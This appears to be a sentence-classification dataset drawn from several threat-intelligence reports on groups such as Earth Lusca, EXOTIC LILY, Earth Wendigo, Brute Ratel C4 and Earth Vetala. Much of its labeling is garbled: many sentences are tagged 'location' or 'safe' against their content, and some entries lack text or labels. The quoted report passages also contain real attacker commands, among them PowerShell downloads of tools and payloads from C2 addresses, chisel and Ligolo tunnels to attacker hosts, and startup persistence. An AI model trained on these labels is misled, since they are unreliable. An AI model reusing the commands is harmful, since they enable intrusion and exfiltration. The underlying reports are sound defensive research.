text: Another option would be to use a browser plug-in like NoScript for Firefox that prevents JavaScript loading from other untrusted sites – although this won’t prevent you getting potentially stung if the well-known and trusted site you’re on is compromised
label: SOFTWARE

text: Payment systems like Apple Pay and Google Pay can offer more protection.
label: SOFTWARE

text: They use a one-time generated series of numbers for each transaction, so that if attackers get their hands on it, they won’t be able to use it in the future.
label: safe

text: It goes without saying that you should keep a close eye on your card statements/bank account at all times – watching out even for small amounts that hackers may be making to test if your card is still active.
label: safe

text: However, the most effective way to stay safe is to use Trend Micro Security.
label: safe

text: How Trend Micro can help Trend Micro Security features two key mechanisms to help stop Magecart attacks:
label: malware

text: It can detect whether the website you want to visit has been injected with skimming code, and block you from visiting the URL (via web reputation), as well as from going to malicious domains the skimming code has access to.
label: safe

text: As announced today, Google has taken action to disrupt the operations of Glupteba, a multi-component botnet targeting Windows computers.
label: location

text: The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).
label: malware

text: For a period of time, we observed thousands of instances of malicious Glupteba downloads per day.
label: location

text: The following image shows a webpage mimicking a software crack download which delivers a variant of Glupteba to users instead of the promised software.
label: malware

text: While analyzing Glupteba binaries, our team identified a few containing a git repository URL: “git.voltronwork.com”.
label: malware

text: This finding sparked an investigation that led us to identify, with high confidence, multiple online services offered by the individuals operating the Glupteba botnet.
label: location

text: This past year, TAG has been collaborating with Google’s CyberCrime Investigation Group to disrupt Glupteba activity involving Google services.
label: malware

text: Parallel to the analysis, tracking, and technical disruption of this botnet, Google has filed a lawsuit against two individuals believed to be located in Russia for operating the Glupteba Botnet and its various criminal schemes.
label: location

text: To add resilience to their infrastructure, the operators have also implemented a backup mechanism using the Bitcoin blockchain.
label: safe

text: Since mid-2021, we have been investigating a rather elusive threat actor called Earth Lusca that targets organizations globally via a campaign that uses traditional social engineering techniques such as spear phishing and watering holes.
label: location

text: Previous research into the group’s activities attributed it to other threat actors such as the Winnti group due to the use of malware such as Winnti, but despite some similarities, we consider Earth Lusca a separate threat actor (we do have evidence, however, that the group is part of the “Winnti cluster,” which is comprised of different groups with the same origin country and share aspects of their TTPs).
label: malware

text: The first cluster is built using virtual private servers (VPS), rented from a service provider, that are used for the group’s watering hole and spear phishing operations, in addition to acting as a command-and-control (C&C) server for malware.
label: location

text: The second cluster is made up of compromised servers running old, open-source versions of Oracle GlassFish Server.
label: location

text: Figure 1.
label: safe

text: An overview of Earth Lusca’s infrastructure      Social Engineering and Vulnerability Exploitation techniques
label: threat-actor

text: The group has three primary attack vectors, two of which involve social engineering.
label: safe

text: The social engineering techniques can be broken down into spear phishing emails and watering hole websites.
label: location

text: Our telemetry data shows Earth Lusca sending spear phishing emails containing malicious links to one of their targets — a media company.
label: attack-pattern

text: The user eventually downloads an archive file containing either a malicious LNK file or an executable — eventually leading to a Cobalt Strike loader.
label: safe

text: In addition to spear phishing emails, Earth Lusca also made use of watering hole websites — they either compromised websites of their targets or set up fake web pages copied from legitimate websites and then injected malicious JavaScript code inside them.
label: attack-pattern

text: This script was designed to show a social engineering message — typically a Flash update popup or a DNS error (note that Adobe discontinued Flash Player at the end of December 2020) that then instructed the visitor to download a malicious file that turned out to be a Cobalt Strike loader.
label: safe

text: Figure 2. Fake installation pop-up     The third attack vector used by Earth Lusca is the exploitation of vulnerabilities that exist in the public-facing applications — such as Microsoft Exchange ProxyShell and Oracle GlassFish — of its targets.
label: location

text: Once these are accomplished, Earth Lusca is free to perform its post-exploitation routines that include installation of tools such as Cobalt Strike and Acunetix (we discuss the post-exploitation routines in detail in the technical brief).
label: location

text: Malware used by Earth Lusca Earth Lusca employs several malware and other hacking tools in its arsenal.
label: threat-actor

text: This post is also available in:      日本語 (Japanese)  Unit 42 released details about a new spear phishing campaign called FreeMilk that uses a relatively new attack technique that can be highly effective.
label: location

text: Phishing attacks are broad, leveraging email messages crafted around common, generalized topics in order to trick recipients into opening an email message and its attachments.
label: attack-pattern

text: Attackers will cast a wide net, with no regard to who the victims are, hoping that a decent percentage of attacks are successful.
label: location

text: Spear phishing, like the name implies, is a more targeted form of phishing which incorporates a theme directly related to the target.
label: attack-pattern

text: FreeMilk is an advanced spear phishing attack campaign that, instead of using a theme to lure targets into downloading a malicious attachment, hijacks an in-progress email conversation.
label: attack-pattern

text: Simply explained:  Figure 1 Conversation Hijacking to Deliver Malware  Unit 42 observed this specific attack taking advantage of a vulnerability in Microsoft Office, which has a patch available.
label: identity

text: ALIEN lives inside multiple privileged processes and receives commands from PREDATOR over IPC.

text: In early September 2021, Threat Analysis Group (TAG) observed a financially motivated threat actor we refer to as EXOTIC LILY, exploiting a 0day in Microsoft MSHTML (CVE-2021-40444).
label: threat-actor

text: Investigating this group's activity, we determined they are an Initial Access Broker (IAB) who appear to be working with the Russian cyber crime gang known as FIN12 (Mandiant, FireEye) / WIZARD SPIDER (CrowdStrike).
label: location

text: EXOTIC LILY is a resourceful, financially motivated group whose activities appear to be closely linked with data exfiltration and deployment of human-operated ransomware such as Conti and Diavol.
label: location

text: Additionally and rather uniquely, they leverage legitimate file-sharing services like WeTransfer, TransferNow and OneDrive to deliver the payload, further evading detection mechanisms.
label: location

text: This level of human-interaction is rather unusual for cyber crime groups focused on mass scale operations.
label: safe

text: EXOTIC LILY’s attack chain has remained relatively consistent throughout the time we’ve been tracking the group: One notable technique is the use of domain and identity spoofing as a way of gaining additional credibility with a targeted organization.
label: location

text: Using spoofed email accounts, attackers would then send spear phishing emails under the pretext of a business proposal, such as seeking to outsource a software development project or an information security service.
label: attack-pattern

text: Distribution of the actor’s working hours suggest they might be working from a Central or an Eastern Europe timezone.
label: safe

text: These samples have some indicators that suggest they were custom-built to be used by the group.
label: safe

text: The loader can be recognized by its use of a unique user-agent “bumblebee” which both variants share.
label: location

text: The malware, hence dubbed BUMBLEBEE, uses WMI to collect various system details such as OS version, user name and domain name, which are then exfiltrated in JSON format to a C2.
label: malware

text: At the time of the analysis, BUMBLEBEE was observed to fetch Cobalt Strike payloads.
label: location

text: EXOTIC LILY activities overlap with a group tracked as DEV-0413 (Microsoft) and were also described by Abnormal in their recent post.
label: threat-actor

text: We believe the shift to deliver BazarLoader, along with some other indicators such as a unique Cobalt Strike profile (described by RiskIQ) further confirms the existence of a relationship between EXOTIC LILY and actions of a Russian cyber crime group tracked as WIZARD SPIDER (CrowdStrike), FIN12 (Mandiant, FireEye) and DEV-0193 (Microsoft).
label: location

text: As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products.

text: Propagation
label: safe

text: The attack begins with a spear-phishing email that is appended with obfuscated JavaScript.
label: location

text: Appending their malicious script to the victim’s email signature to propagate the infection to their contacts.
label: safe

text: Exploiting a webmail system’s cross-site scripting (XSS) vulnerability to allow their malicious JavaScript to be injected on the webmail page permanently.
label: location

text: The registered Service Worker script can hijack login credentials and modify the webmail page to add malicious scripts in case the attackers were unable to inject the XSS vulnerability mentioned above.
label: location

text: After the attackers gain a foothold into the system — either through XSS injection or Service Worker — the next (and final part) of the attack chain, the exfiltration of the mailbox, is initiated.
label: attack-pattern

text: The victim will receive a spear-phishing email disguised as an advertisement with a discount coupon from an online shopping website — however, an obfuscated malicious JavaScript is embedded inside.
label: location

text: The email leverages the webmail system’s search suggestion function to trigger the webpage to execute their script instead of directly running the malicious script.
label: safe

text: Figure 3. The spear-phishing email disguised as an advertisement for a shopping coupon      Figure 4.
label: location

text: However, these emails don’t look like phishing emails and seemed more like real email sent from normal users within the same organization.
label: attack-pattern

text: Further investigation revealed that the attacker had modified the victims’ email signatures through malicious code injection.
label: attack-pattern

text: We think the threat actor used this approach to attempt to infect the victim’s contacts for further propagation.
label: safe

text: Figure 5. Malicious script appended on the victim’s email signature      Figure 6.
label: safe

text: As soon as the user executes the malicious script in the email, a cookie stealer script will be delivered and launched on the browser.
label: malware

text: The framework used to deliver and manage these XSS attack scripts is called “XSSER.ME” or “XSS Framework.” The stolen session keys and browser cookies are also sent to the framework to store in the database.   While a stolen session key may allow the attacker to log into their target’s webmail system without a password, note that this is not the Earth Wendigo operation's ultimate goal.       Figure 7.
label: location

text: The actor prepared two different infection methods.
label: safe

text: The first involves injecting malicious code into the webpage via an XSS vulnerability on the webmail system.
label: attack-pattern

text: The vulnerability, which exists inside the webmail system’s shortcut feature, allows users to create links on the webmail front page.
label: tools

text: The attacker can add a shortcut with a crafted payload by exploiting the XSS vulnerability, which replaces part of the original script from the webmail system with malicious JavaScript code.
label: location

text: We have reported the vulnerability to the company that developed the webmail system, which informed us that the vulnerability had been fixed since January 2020.
label: safe

text: Figure 8.
label: safe

text: A shortcut containing malicious code that was added to the webmail system      Figure 9.
label: safe

text: The query format used to trigger the XSS vulnerability     Service Worker script exploitation
label: attack-pattern

text: By examining one of the malicious scripts from the Earth Wendigo campaign, we discovered that it uploaded the tampered Service Worker script to the webmail server disguised as an original script provided by the server.
label: threat-actor

text: It then registers the uploaded script to the user’s Service Worker before removing it from the server immediately after registration.
label: safe

text: For requests sent to “/cgi-bin/start,” which is a page wrapper used to show the main webmail page, the Service Worker script will reply by sending another page to the victim.
label: location

text: This new page is almost similar to the original wrapper but injected with a script element meant to load malicious script from Earth Wendigo’s server.
label: location

text: Therefore, the victim also loads the malicious script with the replaced wrapper page whenever they access the webmail server with the malicious Service Worker enabled in the background.
label: tools

text: We found that the returned script is a backdoor that gets its instructions from the WebSocket server.

text: Additional Findings
label: safe

text: Besides their attack on webmail servers, we also found multiple malware variants used by Earth Wendigo.
label: safe

text: However, we don’t know what code they delivered because the server was already down when we were verifying the malware variants.

text: Figure 17.

text: The Python script decompiled from the malware
label: safe

text: While Earth Wendigo uses typical spear-phishing techniques to initiate their attack, the threat actor also uses many atypical techniques to infiltrate the targeted organizations, such as the use of mail signature manipulation and Service Worker infection.
label: threat-actor

text: The impact of spear-phishing attacks can be minimized by following security best practices, which include refraining from opening emails sent by suspicious sources.
label: location

text: To avoid XSS attacks similar to what we described in this report, we recommend adapting Contant-Security-Policy (CSP) for websites.
label: attack-pattern

label: threat-actor

text: Based on the number of “likes” the malware had generated, Faghani estimated that over 100,000 users had been infected with the malware.
label: safe

text: Filmkan is very flexible, giving it more capability than simple interaction with social networks.
label: safe

text: Our WildFire analysis cloud first picked up samples of this malware on January 22 and thus far we’ve collected 44 distinct samples the display the behavior described by Faghani.
label: tools

text: After a few seconds the video tells the user they need to download an update for Flash player, which is the initial dropper executable.
label: TIME

text: The Filmkan dropper has a Flash icon to help make it appear as a legitimate update.  The author of Filmkan created the dropper using AutoHotkey (AHK), a legitimate tool for creating Windows applications using a custom scripting language.
label: location

text: Chrome extensions  allow developers to extend Google’s Chrome browser, typically by adding new functionality.
label: safe

text: The current version of the script contains three primary functions.
label: safe

text: When Faghani first published his analysis this component of the malware was forcing the user’s Facebook account to “like” specific posts on a community page titled Sabır.
label: location

text: Users should be suspicious of any message indicating that an update for Flash is available in Google Chrome, as Chrome contains an integrated Flash runtime that is updated by Google.
label: safe

text: Organizations should block access to the following domains to prevent Filmkan from receiving updates from the attacker.
label: safe

text: The Bash Uploader script allows its customers to send code coverage reports to the Codecov platform for analysis.
label: safe

text: Organizations using Codecov’s Bash Uploader script, or one of the other impacted tools should carefully evaluate their exposure to this threat.
label: safe

text: This post is also available in:      日本語 (Japanese)  Unit 42 continuously hunts for new and unique malware samples that match known advanced persistent threat (APT) patterns and tactics.
label: location

text: The sample contained a malicious payload associated with Brute Ratel C4 (BRc4), the newest red-teaming and adversarial attack simulation tool to hit the market.
label: location

text: Additionally, pivoting on the certificate and other artifacts, we identified a total of 41 malicious IP addresses, nine BRc4 samples, and an additional three organizations across North and South America who have been impacted by this tool so far.
label: location

text: This unique sample was packaged in a manner consistent with known APT29 techniques and their recent campaigns, which leveraged well-known cloud storage and online collaboration applications.
label: location

text: Attempts to execute the benign application from the ISO-mounted folder resulted in the loading of the malicious payload as a dependency through a technique known as DLL search order hijacking.
label: attack-pattern

text: We encourage all security vendors to create protections to detect activity from this tool and all organizations to be on alert for activity from this tool.  Palo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Cortex XDR and WildFire malware analysis.
label: location

text: Shellcode
label: safe

text: Update Badger_x64.exe
label: safe

text: Employment
label: safe

text: At the time, its development was a part-time effort by a security engineer named Chetan Nayak (aka Paranoid Ninja) living in India.
label: location

text: That same month, he released Brute Ratel v0.9.0 (Checkmate), which is described as the “biggest release for Brute Ratel till date.”  However, of greater concern, the release description also specifically noted that “this release was built after reverse engineering several top tier EDR and Antivirus DLLs.”
label: location

text: In terms of features, BRc4 advertises the following capabilities:
label: safe

text: The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum vitae (similar to a resume) of an individual named Roshan.
label: SHA2

text: It was uploaded to VirusTotal on May 19, 2022, from Sri Lanka.
label: safe

text: The following table shows a side-by-side comparison of Roshan_CV.ISO and that of a previously identified APT29 sample (Decret.ISO).
label: location

text: Figure 9 is a screenshot of the default Windows File Explorer; “show hidden files” is not checked.
label: safe

text: In both images, the user is presented with a shortcut file (LNK file) that starts the malicious activity when double-clicked.
label: safe

text: Figure 10 shows how the ISOs would appear when show hidden files” is enabled for viewing.
label: safe

text: The flow of execution is the following:  Roshan_CV.ISO→Roshan-Bandar_CV_Dialog.LNK→cmd.exe→OneDriveUpdater.exe→version.dll→OneDrive.Update  Decret.ISO→Decret.LNK→cmd.exe→HPScan.exe→version.dll→HPScanApi.dll
label: safe

text: The delivery of packaged ISO files is typically sent via spear phishing email campaigns or downloaded to the victim by a second-stage downloader.  While we lack insight into how this particular payload was delivered to a target environment, we observed connection attempts to the C2 server originating from three Sri Lankan IP addresses between May 19-20.
label: attack-pattern

text: Version.dll is a modified version of a legitimate Microsoft file written in C++.
label: safe

text: The implanted code begins when the DLL is loaded via DLL_PROCESS_ATTACH and performs the following at the DLLMain subroutine:  The technique outlined above uses process injection via undocumented Windows NTAPI calls.
label: location

text: The decrypted payload is now running within the runtimebroker.exe memory space.
label: safe

text: The following is a snippet of code from version.dll that starts the execution of the in-memory decrypted payload.
label: safe

text: The purpose of this is to copy the Brute Ratel C4 code (x64 assembly) onto the stack eight bytes at a time and eventually reassemble it into a memory space for execution – a DLL with a stripped MZ header.
label: malware

text: When finished, the code performs the following.
label: safe

text: This data includes the encrypted configuration settings for Brute Ratel C4.
label: safe

text: The 16-byte RC4 decryption key is: bYXJm/3#M?:XyMBF
label: safe

text: The decrypted configuration file is:  Each parameter is delineated with a pipe | character, and one of the values is the IP seen earlier of 174.129.157[.]251 and port of 443.
label: location

text: The IP 174.129.157[.]251 is hosted on Amazon AWS, and Palo Alto Networks Cortex Xpanse history shows the IP had TCP port 443 open from April 29, 2022, until May 23, 2022, with a self-signed SSL certificate impersonating Microsoft Security:
label: IPV4

text: Once the SSL handshake to IP 174.129.157[.]251 is complete, the following data is sent via HTTP POST to the Brute Ratel C4 listener port.
label: location

text: Example of badger_x64.exe:
label: safe

text: In this case, the sample is configured to communicate with IP 159.65.186[.]50 on TCP port 443.
label: location

text: After validating that badger_x64.exe and OneDrive.Update were both BRc4 payloads, we set to work analyzing the employment of this second sample.
label: location

text: Coincidentally, this happens to be one day after the ​​Roshan_CV.ISO file was uploaded.
label: safe

text: As noted above, the sample was configured to call home to 159.65.186[.]50 on port 443.
label: location

text: Palo Alto Networks Cortex Xpanse history shows that this port was open from May 21-June 18, 2022, with the same “Microsoft Security” self-signed SSL certificate seen above.
label: location

text: Evaluating netflow connections for 159.65.186[.]50 during this time window revealed several connections to ports 22, 443 and 8060 originating from a Ukrainian IP (213.200.56[.]105).
label: IPV4

text: A deeper look at connections in and out of 213.200.56[.]105 further revealed several flows over UDP port 33445.
label: location

text: Examining additional connections to port 443 on 159.65.186[.]50, we identified several suspected victims including an Argentinian organization, an IP television provider providing North and South American content, and a major textile manufacturer in Mexico.
label: IPV4

text: Coincidentally, recent attempts to browse the textile manufacturer’s website result in a 500 internal server error message.
label: safe

text: Given the geographic dispersion of these victims, the upstream connection to a Ukrainian IP and several other factors, we believe it is highly unlikely that BRc4 was deployed in support of legitimate and sanctioned penetration testing activities.
label: location

text: Expanding our research beyond the two samples discussed above, we have also identified an additional seven samples of BRc4 dating back to February 2021.
label: tools

text: The "Brute Ratel C4 Tool Command and Control Traffic Detections" signature is threat ID 86647.
label: safe

text: We believe it is imperative that all security vendors create protections to detect BRc4 and that all organizations take proactive measures to defend against this tool.  Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.
label: location

text: Learn more about the Cyber Threat Alliance.
label: safe

text: This impersonation does not imply a vulnerability in Microsoft’s products or services.  Brute Ratel C4 ISO Samples:  1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C  X64 Brute Ratel C4 Windows Kernel Module:  31ACF37D180AB9AFBCF6A4EC5D29C3E19C947641A2D9CE3CE56D71C1F576C069  APT29 ISO Samples:  F58AE9193802E9BAF17E6B59E3FDBE3E9319C5D27726D60802E3E82D30D14D46
label: SHA2

text: We believe (with moderate confidence) that this newly identified activity is connected to MuddyWater (also known as TEMP.Zagros, Static Kitten, Seedworm).
label: location

text: This campaign uses the following legitimate remote admin tools such as:  ScreenConnect RemoteUtilities  We have named this intrusion set Earth Vetala.
label: location

text: Earth Vetala used spearphishing emails with embedded links to a legitimate file-sharing service to distribute their malicious package.
label: safe

text: The threat actors would then initiate communications with additional command-and-control (C&C) infrastructure to execute obfuscated PowerShell scripts.
label: location

text: Earth Vetala historically targets countries in the Middle East.
label: safe

text: The phishing emails and lure documents contain embedded URLs linking to a legitimate file-sharing service to distribute archives containing the ScreenConnect remote administrator tool.
label: attack-pattern

text: During this campaign, threat actors used post-exploitation tools to dump passwords, tunnel their C&C communication using open-source tools, and use additional C&C infrastructure to establish a persistent presence within targeted hosts and environments.
label: location

text: Technical Analysis
label: safe

text: Figure 1. Phishing Email with the embedded URL      The email attempts to convince recipients to click the URL and download a malicious file.
label: attack-pattern

text: The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used.
label: location

text: Otherwise, the TTPs in use remain broadly similar.
label: safe

text: RemoteUtilities Analysis
label: tools

text: When the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:
label: safe

text: RemoteUtilities Installation     The MSI installer installs a service on the victim machine called Remote Utilities – Host:      Figure 5.
label: malware

text: Remote Utilities Service     The service then communicates with the domain id.remoteutilities.com, which belongs to RemoteUtilities.
label: malware

text: This feature allows an intermediary Internet server to broker the connection, similar to a proxy server.
label: safe

text: Figure 6. id-server connection
label: safe

text: They were targeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a ScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)
label: SHA1

text: As noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at instance-sy9at2-relay.screenconnect.com and resolves to 51.68.244.39.
label: location

text: cmd.exe net user /domain
label: malware

text: The command above allows the attacker to get all the users from the domain controller.
label: safe

text: The next command executed is the following: powershell.exe -exec bypass -w 1 -file a.ps1
label: safe

text: This is a command to execute a PowerShell script of some kind.
label: attack-pattern

text: However, we did not have access to the a.ps1 file.
label: safe

text: The next command issued is the following: powershell.exe iwr -uri http://87.236.212[.]184/SharpChisel.exe -outfile c:\programdata\SharpChisel.exe -usebasicparsing
label: URL

text: The command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\programdata directory.
label: IPV4

text: The name SharpChisel may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called chisel.
label: location

text: The above IP address is geolocated to a server in Iran.
label: safe

text: The following command then configures SharpChisel: C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999
label: safe

text: Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line: powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:443 R:8888:127.0.0.1:9999
label: location

text: A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command: C:\programdata\SharpChisel.exe client 23.95.215[.]100:8080 r:8888:127.0.0.1:9999 It is then configured with the following command line PowerShell command: powershell.exe C:\programdata\SharpChisel.exe client 23.95.215[.]100:8080 R:8888:127.0.0.1:9999
label: attack-pattern

text: We believe that the threat actor was unable to configure SharpChisel to work correctly.
label: safe

text: That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.
label: location

text: Figure 7.
label: safe

text: LIGOLO execution example
label: safe

text: This was done using two separate commands: C:\programdate\1.exe -relayserver 87.236.212[.]184:5555  C:\users\public\new.exe -relayserver 87.236.212[.]184:5555
label: safe

text: We then see the threat actor again attempting to use SharpChisel several times using the following command: C:\programdata\SharpChisel.exe  client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999  powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999
label: safe

text: We conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools.
label: safe

text: The following PowerShell command was used for this: powershell.exe iwr -uri hxxp://87.236.212[.]184/out1 -outfile c:\users\public\out1.exe -usebasicparsing
label: attack-pattern

text: Using a UPX unpacker, we were able to extract the contents, which consists of a Python executable.
label: safe

text: We then decompiled the python executable using pyinstxtractor.py to get all of the Python bytecode files.
label: safe

text: The out1.exe RAT has the following capabilities:  Data encoding Email parsing File and registry copy HTTP/S connection support Native command line Process and file execution
label: attack-pattern

text: After this, the file C:\users\public\Browser64.exe is run.
label: safe

label: location

text: Finally, we observed a persistence mechanism being set using the following commands: cmd.exe /c Wscript.exe "C:\Users\[REDACTED]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\news.js"  cmd.exe /c "C:\Users\[REDACTED]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\newsblog.js"
label: tools

text: We were able to get a copy of newsblog.js, which is a simple VBS downloader that communicates with the following URL: hxxp://23[.]95[.]215[.]100:8008/index.jsp/7e95a3d753cc4a17793ef9513e030b49/4t2Fg7k6wWRnKgd9      Figure 9.
label: MD5

text: newsblog.js
label: safe

text: The script then executes an HTTP GET request to the C&C URL, grabs the server's response, and sleeps for 10 seconds.
label: location

text: The response from the server contains an encoded PowerShell script, which is executed in memory.
label: attack-pattern

text: Decoding this script reveals that it contains a backdoor:
label: safe

text: Figure 10. deobfuscated PowerShell backdoor     The screenshot above shows an abbreviated view of the in-memory PowerShell backdoor.

text: The PowerShell backdoor has the following capabilities.

text: Check for Skype connectivity Download and install Skype Encoded communication with its C2 Execute commands sent from the C2 server Get multifactor authentication settings Get the currently logged on user and OS version  Earth Vetala Footprint Earth Vetala conducted an extensive offensive campaign targeting multiple countries.
label: location

text: We observed it operating in the following countries:  Azerbaijan Bahrain Israel Saudi Arabia United Arab Emirates       Figure 11.
label: safe

text: Affected countries     We observed Earth Vetala target the following sectors:  Government Agencies Academia Tourism  Trend Micro Solutions Earth Vetala represents an interesting threat.
label: threat-actor

text: This is unexpected since we believe this attack is connected to the MuddyWater threat actors — and in other connected campaigns, the attackers have shown higher levels of technical skill.
